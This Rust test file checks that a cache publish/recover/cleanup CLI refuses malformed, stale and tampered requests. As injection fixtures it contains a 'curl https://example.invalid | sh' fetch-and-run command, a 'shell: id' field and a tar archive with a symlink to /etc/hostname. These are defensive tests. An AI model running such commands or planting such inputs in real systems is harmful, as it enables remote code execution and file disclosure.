// SPDX-FileCopyrightText: 2026 Alexey Zhokhov
// SPDX-License-Identifier: Apache-2.0

use super::*;

#[test]
fn gc1_t28_rejects_invalid_state() -> Result<(), Box<dyn Error>> {
    let admitted = admission_record("admitted", &[]);
    let inventory = inventory_record();
    let key = generation_key(0);
    let expected = expected_body(&key);

    let (root, path) = write_request(
        "cache-publish.json",
        &json!({"schema": 1, "operation": "launch", "admission": admitted}),
    )?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "unknown operation",
    )?;
    cleanup(&root);

    let (root, path) = write_request("cache-publish.json", &recover_body(&inventory, &expected))?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "operation mismatch",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-publish.json",
        &json!({"schema": 1, "operation": "publish", "admission": admitted, "inventory": inventory, "expected": expected, "command": "curl https://example.invalid | sh"}),
    )?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "command injection",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-recover.json",
        &json!({"schema": 1, "operation": "recover", "inventory": inventory, "expected": expected, "shell": "id"}),
    )?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "shell injection",
    )?;
    cleanup(&root);

    let (root, path) = write_request("cache-recover.json", &recover_body(&inventory, &expected))?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "wrong request file",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-publish.json",
        &publish_body(&admitted, &inventory, &expected),
    )?;
    rejected(&run_cli("cache-nuke-v9", &root, &path)?, "unknown op tag")?;
    cleanup(&root);

    let blocked = admission_record("blocked", &["unknown-inventory"]);
    let (root, path) = write_request(
        "cache-publish.json",
        &publish_body(&blocked, &inventory, &expected),
    )?;
    rejected(
        &run_cli("cache-publish-v1", &root, &path)?,
        "blocked admission",
    )?;
    cleanup(&root);

    Ok(())
}

#[test]
fn gc1_t28_rejects_stale_state() -> Result<(), Box<dyn Error>> {
    let inventory = inventory_record();
    let key = generation_key(0);
    let expected = expected_body(&key);

    let mut corrupt = inventory.clone();
    let first = corrupt["entries"][0].clone();
    corrupt["entries"][0] = corrupt["entries"][1].clone();
    corrupt["entries"][1] = first;
    let (root, path) = write_request("cache-recover.json", &recover_body(&corrupt, &expected))?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "corrupt inventory",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-cleanup.json",
        &cleanup_body(&inventory, &json!([4242])),
    )?;
    rejected(
        &run_cli("cache-cleanup-v1", &root, &path)?,
        "unknown cleanup id",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-cleanup.json",
        &cleanup_body(&inventory, &json!(["cache-*"])),
    )?;
    rejected(
        &run_cli("cache-cleanup-v1", &root, &path)?,
        "prefix cleanup id",
    )?;
    cleanup(&root);
    Ok(())
}

#[test]
fn gc1_t28_rejects_tampered_state() -> Result<(), Box<dyn Error>> {
    let admitted = admission_record("admitted", &[]);
    let inventory = inventory_record();
    let key = generation_key(0);
    let expected = expected_body(&key);

    let (root, path) = write_request(
        "cache-publish.json",
        &publish_body(&admitted, &inventory, &expected),
    )?;
    write_payload(&root, b"not a gzip archive")?;
    let output = run_cli("cache-publish-v1", &root, &path)?;
    rejected(&output, "non-archive payload")?;
    if stdout_text(&output).contains("state snapshot published") {
        return Err(fail("refused publish must never report published"));
    }
    cleanup(&root);

    let (root, path) = write_request(
        "cache-recover.json",
        &recover_body(&inventory_with(&[entry(7, 0, 4)]), &expected),
    )?;
    write_payload(&root, b"tiny")?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "stored bytes mismatch",
    )?;
    cleanup(&root);

    let (root, path) = write_request(
        "cache-recover.json",
        &json!({"schema": 1, "operation": "recover", "inventory": inventory}),
    )?;
    rejected(
        &run_cli("cache-recover-v1", &root, &path)?,
        "missing expected",
    )?;
    cleanup(&root);
    Ok(())
}

#[test]
#[cfg(unix)]
fn gc1_t28_recover_refuses_symlinked_member() -> Result<(), Box<dyn Error>> {
    let key = generation_key(0);
    let expected = expected_body(&key);
    let build = scratch_root();
    fs::create_dir_all(&build).map_err(|error| fail(&format!("create build dir: {error}")))?;
    let staging = build.join("staging-link");
    drop(fs::remove_dir_all(&staging));
    fs::create_dir_all(staging.join("state"))
        .map_err(|error| fail(&format!("create staging: {error}")))?;
    fs::write(staging.join("state/ok"), "fixture state bytes")
        .map_err(|error| fail(&format!("write member: {error}")))?;
    std::os::unix::fs::symlink("/etc/hostname", staging.join("state/link"))
        .map_err(|error| fail(&format!("write link: {error}")))?;
    let archive = build.join("link.tar.gz");
    let output = Command::new("tar")
        .arg("-czf")
        .arg(&archive)
        .arg("-C")
        .arg(&staging)
        .arg("state")
        .output()
        .map_err(|error| fail(&format!("run tar: {error}")))?;
    if !output.status.success() {
        return Err(fail("tar pack failed"));
    }
    let linked = fs::read(&archive).map_err(|error| fail(&format!("read archive: {error}")))?;
    let linked_inventory = inventory_with(&[entry(7, 0, linked.len() as u64)]);
    let (root, path) = write_request(
        "cache-recover.json",
        &recover_body(&linked_inventory, &expected),
    )?;
    write_payload(&root, &linked)?;
    drop(fs::remove_dir_all(&build));
    let output = run_cli("cache-recover-v1", &root, &path)?;
    rejected(&output, "symlinked member")?;
    if stdout_text(&output).contains("state snapshot recovered") {
        return Err(fail("symlinked member must never report recovery"));
    }
    if root.join("velnor-gc1/state").exists() {
        return Err(fail("symlinked member must not land"));
    }
    cleanup(&root);
    Ok(())
}
